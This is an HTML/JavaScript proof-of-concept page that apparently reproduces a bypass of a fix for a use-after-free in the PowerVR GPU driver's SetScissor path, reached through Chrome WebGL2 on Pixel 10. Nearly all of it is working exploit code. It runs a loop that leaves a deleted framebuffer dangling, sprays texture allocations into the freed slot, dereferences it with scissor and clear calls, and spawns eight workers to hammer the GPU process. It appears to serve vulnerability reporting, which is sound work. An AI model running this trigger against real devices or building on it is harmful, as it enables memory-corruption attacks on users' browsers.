<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>474266014 bypass PoC (fast)</title></head>
<body style="font-family:system-ui;margin:1em">
<h3>PowerVR SetScissor UAF — fix bypass (fast / short-window)</h3>
<p>Pixel 10 only. Watch the counters. A jump in <b style="color:#c00">CONTEXT LOST</b>,
a frozen page, or Chrome "Aw snap" = GPU process crashing (the UAF). Triggers hard in the first seconds.</p>
<div style="font-size:22px;font-weight:bold">
iters: <span id="c">0</span> &nbsp;|&nbsp; <span style="color:#c00">CONTEXT LOST: <span id="x">0</span></span>
</div>
<pre id="log" style="background:#111;color:#3e6;padding:1em;white-space:pre-wrap;font-size:13px"></pre>
<script>
const logEl=document.getElementById('log'),cEl=document.getElementById('c'),xEl=document.getElementById('x');
let iters=0,lost=0;
const log=m=>{logEl.textContent=(new Date().toLocaleTimeString()+' '+m+'\n'+logEl.textContent).slice(0,3000);};
const onLost=w=>{lost++;xEl.textContent=lost;log('*** CONTEXT LOST ('+w+') total='+lost+' -> GPU crash/UAF ***');};

// Reused-context tight loop. Each iter: attach R->A (complete), bind B (current),
// resize R (ScopedBufferReattacher direct-binds A then B -> driver "previous complete"=A),
// delete A (not current -> not rebound -> dangling), spray, scissor (SetScissor derefs freed A).
const LOOP = function(gl, onlost){
  const RB=gl.RENDERBUFFER, FB=gl.FRAMEBUFFER, C0=gl.COLOR_ATTACHMENT0, T2=gl.TEXTURE_2D;
  const Rb=gl.createRenderbuffer(); gl.bindRenderbuffer(RB,Rb); gl.renderbufferStorage(RB,gl.RGBA8,64,64);
  const B=gl.createFramebuffer(); gl.bindFramebuffer(FB,B); gl.framebufferRenderbuffer(FB,C0,RB,Rb);
  gl.enable(gl.SCISSOR_TEST);
  let n=0;
  for(let i=0;i<2000;i++){
    const R=gl.createRenderbuffer(); gl.bindRenderbuffer(RB,R); gl.renderbufferStorage(RB,gl.RGBA8,64,64);
    const A=gl.createFramebuffer(); gl.bindFramebuffer(FB,A); gl.framebufferRenderbuffer(FB,C0,RB,R); // A complete
    gl.bindFramebuffer(FB,B);                                   // current=B, A not current
    gl.bindRenderbuffer(RB,R); gl.renderbufferStorage(RB,gl.RGBA8,(i&1)?128:96,(i&1)?128:96); // -> "previous complete"=A
    gl.deleteFramebuffer(A);                                    // dangling
    const t=gl.createTexture(); gl.bindTexture(T2,t);
    gl.texImage2D(T2,0,gl.RGBA8,16,16,0,gl.RGBA,gl.UNSIGNED_BYTE,null); // spray freed slot
    gl.scissor(i&31,i&31,10,10); gl.clear(gl.COLOR_BUFFER_BIT);  // SetScissor derefs freed A
    gl.deleteRenderbuffer(R); gl.deleteTexture(t);
    n++;
    if(gl.isContextLost()){ onlost('loop'); return n; }
  }
  gl.flush();
  return n;
};

function run(){
  const canvas=new OffscreenCanvas(256,256);
  const gl=canvas.getContext('webgl2',{antialias:false,depth:false,stencil:false});
  if(!gl){log('no webgl2 (main)');return;}
  try{canvas.addEventListener('webglcontextlost',()=>onLost('main'));}catch(e){}
  const tick=()=>{ const n=LOOP(gl,onLost); iters+=n; cEl.textContent=iters;
    if(!gl.isContextLost()) setTimeout(tick,0); };
  tick();
}

// 8 worker copies to widen the alloc/race window and hit the GPU process hard.
const wsrc='const LOOP='+LOOP.toString()+';'+
  'onmessage=()=>{const c=new OffscreenCanvas(256,256);const gl=c.getContext("webgl2",{antialias:false});'+
  'if(!gl){postMessage({e:"nowebgl"});return;}try{c.addEventListener("webglcontextlost",()=>postMessage({lost:1}));}catch(e){}'+
  '(function t(){const n=LOOP(gl,()=>postMessage({lost:1}));postMessage({n});if(!gl.isContextLost())setTimeout(t,0);})();};';
try{
  const url=URL.createObjectURL(new Blob([wsrc],{type:'text/javascript'}));
  for(let i=0;i<8;i++){const w=new Worker(url);
    w.onmessage=e=>{const d=e.data||{};if(d.lost)onLost('worker');else if(d.n){iters+=d.n;cEl.textContent=iters;}else if(d.e)log('worker: '+d.e);};
    w.postMessage(1);}
}catch(e){log('worker spawn failed: '+e);}

run();
</script></body></html>
